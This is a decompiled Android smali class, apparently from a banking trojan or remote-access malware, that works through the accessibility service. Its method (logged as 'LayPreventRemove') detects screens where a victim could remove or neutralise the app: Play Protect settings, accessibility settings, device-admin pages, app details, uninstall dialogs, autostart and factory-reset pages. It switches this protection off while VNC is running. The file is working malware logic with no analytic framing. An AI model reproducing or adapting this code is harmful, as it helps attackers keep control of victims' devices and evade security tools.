.class public Lfddo/case;
.super Lfddo/try;
.source "SourceFile"


# direct methods
.method public constructor <init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 0

    invoke-direct/range {p0 .. p5}, Lfddo/try;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    return-void
.end method


# virtual methods
.method public break(Ljava/lang/String;)Z
    .locals 8

    iget-object v0, p0, Lfddo/try;->ifdf:Landroid/content/Context;

    const-string v1, "vnc"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    const-string v1, ">>LayPreventRemove"

    const/4 v2, 0x0

    if-nez v0, :cond_1

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_0

    const-string p1, "processLayout: vnc is running, protection disabled"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return v2

    :cond_1
    invoke-virtual {p0}, Lfddo/try;->for()Z

    move-result v0

    if-nez v0, :cond_2

    return v2

    :cond_2
    const-string v0, "gp_pages"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const-string v3, "widget.Switch"

    const/4 v4, 0x2

    const/4 v5, 0x1

    if-eqz v0, :cond_a

    const-string p1, "com.android.vending|com.google.android.gms"

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result v0

    const-string v6, "Play Protect"

    if-eqz v0, :cond_3

    iget-object v0, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {v0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v7, "@gmail.com"

    invoke-virtual {v0, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    iget-object v7, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {v7}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-nez v0, :cond_3

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_3

    return v5

    :cond_3
    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_9

    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "verifyappssettingsactivity"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_5

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_4

    const-string p1, "gp_pages: act is VerifyAppsSettingsActivity"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_4
    return v5

    :cond_5
    iget-object p1, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {p1}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "toolbar_item_play_protect_settings"

    invoke-static {p1, v0}, Lfddo/fddo;->else(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_7

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_6

    const-string p1, "gp_pages: settings icon found"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_6
    return v5

    :cond_7
    :try_start_0
    iget-object p1, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {p1}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-virtual {p1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_9

    invoke-virtual {p0, v3}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-ne p1, v4, :cond_9

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_8

    const-string p1, "gp_pages: 2 switches & Play Protect label found"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_8
    return v5

    :catch_0
    :cond_9
    return v2

    :cond_a
    const-string v0, "xiaomi_autostart"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    const-string p1, "com.miui.securitycenter"

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_2e

    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "autostartmanagementactivity"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_2e

    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-eqz p1, :cond_2e

    return v5

    :cond_b
    const-string v0, "usage_stats"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    sget-object p1, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_c

    return v2

    :cond_c
    invoke-static {}, Lcom/beginhigh19/p023w;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "usageaccess"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_2e

    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-eqz p1, :cond_2e

    return v5

    :cond_d
    const-string v0, "acsb_pages"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const-string v6, "widget.Button"

    if-eqz v0, :cond_18

    const-string p1, "com.android.settings|com.samsung.accessibility|com.google.android.settings"

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_e

    return v2

    :cond_e
    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "accessibilityinstalled"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_16

    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "accessibilitysettings"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_f

    goto :goto_0

    :cond_f
    invoke-virtual {p0}, Lfddo/try;->goto()Z

    move-result p1

    if-nez p1, :cond_10

    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-eqz p1, :cond_12

    :cond_10
    iget-object p1, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {p1}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "/switch_text"

    invoke-static {p1, v0}, Lfddo/fddo;->else(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_12

    iget-object p1, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {p1}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    const-string v0, "/switch_widget"

    invoke-static {p1, v0}, Lfddo/fddo;->else(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    if-eqz p1, :cond_12

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_11

    const-string p1, "acsb_pages: has switch_widget & loader/bot title"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_11
    return v5

    :cond_12
    invoke-virtual {p0}, Lfddo/try;->goto()Z

    move-result p1

    if-nez p1, :cond_13

    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-eqz p1, :cond_15

    :cond_13
    invoke-virtual {p0, v3}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-ne p1, v5, :cond_15

    invoke-virtual {p0, v6}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-nez p1, :cond_15

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_14

    const-string p1, "acsb_pages: has loader/bot title & 1 switch"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_14
    return v5

    :cond_15
    return v2

    :cond_16
    :goto_0
    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_17

    const-string p1, "acsb_pages: act is accessibility"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_17
    return v5

    :cond_18
    const-string v0, "app_page"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_20

    sget-object p1, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_19

    return v2

    :cond_19
    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-nez p1, :cond_1a

    invoke-virtual {p0}, Lfddo/try;->goto()Z

    move-result p1

    if-eqz p1, :cond_1c

    :cond_1a
    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "installedappdetails"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_1c

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_1b

    const-string p1, "app_page: page details detected"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1b
    return v5

    :cond_1c
    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-nez p1, :cond_1d

    invoke-virtual {p0}, Lfddo/try;->goto()Z

    move-result p1

    if-eqz p1, :cond_1f

    :cond_1d
    invoke-virtual {p0, v6}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-lt p1, v4, :cond_1f

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_1e

    const-string p1, "app_page: page details with butts detected"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1e
    return v5

    :cond_1f
    return v2

    :cond_20
    const-string v0, "devadmins_page"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_24

    sget-object p1, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_21

    return v2

    :cond_21
    invoke-virtual {p0}, Lfddo/try;->case()Ljava/lang/String;

    move-result-object p1

    const-string v0, "deviceadmin"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_23

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_22

    const-string p1, "devadmins_page: dev admins detected"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_22
    return v5

    :cond_23
    return v2

    :cond_24
    const-string v0, "uns_dialog"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_29

    sget-object p1, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_25

    return v2

    :cond_25
    invoke-virtual {p0}, Lfddo/try;->else()Z

    move-result p1

    if-nez p1, :cond_26

    invoke-virtual {p0}, Lfddo/try;->goto()Z

    move-result p1

    if-eqz p1, :cond_28

    :cond_26
    const-string p1, "widget.TextView"

    invoke-virtual {p0, p1}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-ne p1, v4, :cond_28

    invoke-virtual {p0, v6}, Lfddo/try;->try(Ljava/lang/String;)I

    move-result p1

    if-ne p1, v4, :cond_28

    iget-boolean p1, p0, Lfddo/try;->fddo:Z

    if-eqz p1, :cond_27

    const-string p1, "shortapp_menu: uninstall dialog detected"

    invoke-static {v1, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_27
    return v5

    :cond_28
    return v2

    :cond_29
    const-string v0, "reset_page"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2e

    sget-object p1, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {p0, p1}, Lfddo/try;->fddo(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_2a

    return v2

    :cond_2a
    iget-object p1, p0, Lfddo/try;->this:Lcom/beginhigh19/p023w;

    invoke-virtual {p1}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-static {p1}, Lfddo/fddo;->class(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    move-result-object p1

    sget-object v0, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {p1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "reset all network settings"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2d

    const-string v0, "restablecimiento de f\u00e1brica"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2b

    goto :goto_1

    :cond_2b
    const-string v0, "factory"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2c

    const-string v0, "predeterminados"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2c

    return v2

    :cond_2c
    const-string v0, "reset"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2d

    const-string v0, "restablecer"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-nez p1, :cond_2d

    return v2

    :cond_2d
    :goto_1
    return v5

    :cond_2e
    return v2
.end method
